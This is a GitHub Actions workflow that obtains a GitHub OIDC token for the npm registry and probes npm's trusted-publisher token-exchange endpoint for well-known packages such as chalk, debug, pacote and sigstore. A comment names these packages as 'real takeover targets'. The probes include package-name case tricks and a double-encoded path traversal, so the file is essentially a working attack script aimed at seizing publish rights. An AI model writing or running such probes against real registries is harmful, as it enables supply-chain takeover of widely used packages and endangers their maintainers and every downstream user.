name: oidcprobe
on:
  push:
    branches: [main]
permissions:
  id-token: write
  contents: read
jobs:
  envjob:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - name: envprobe
        run: |
          set +e
          NPM="https://registry.npmjs.org/-/npm/v1/oidc/token/exchange/package"
          T=$(curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=npm:registry.npmjs.org" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])")
          echo "===SUB_ENV==="; echo "$T" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c "import sys,json;d=json.load(sys.stdin);print('sub=',d['sub']);print('repo=',d['repository'])"
          probe(){ echo "===P $1 $2==="; curl -s -m 20 -o /tmp/r -w "HTTP:%{http_code}\n" -X POST "$NPM/$2" -H "Authorization: Bearer $3" -H "Content-Type: application/json" -d '{}'; cat /tmp/r; echo; }
          # Packages KNOWN to use npm trusted publishers / provenance (real takeover targets)
          probe TP_sigstore_env "sigstore" "$T"
          probe TP_provenance "provenance" "$T"
          probe TP_pacote "pacote" "$T"
          probe TP_tuf "@tufjs%2fmodels" "$T"
          probe TP_chalk "chalk" "$T"
          probe TP_debug "debug" "$T"
          probe TP_slash "slash" "$T"
          probe TP_destroy "destroy" "$T"
          # case games on package name
          probe TP_caseExpress "Express" "$T"
          # double-encoded traversal
          probe TP_dblenc "%252e%252e%252fchalk" "$T"
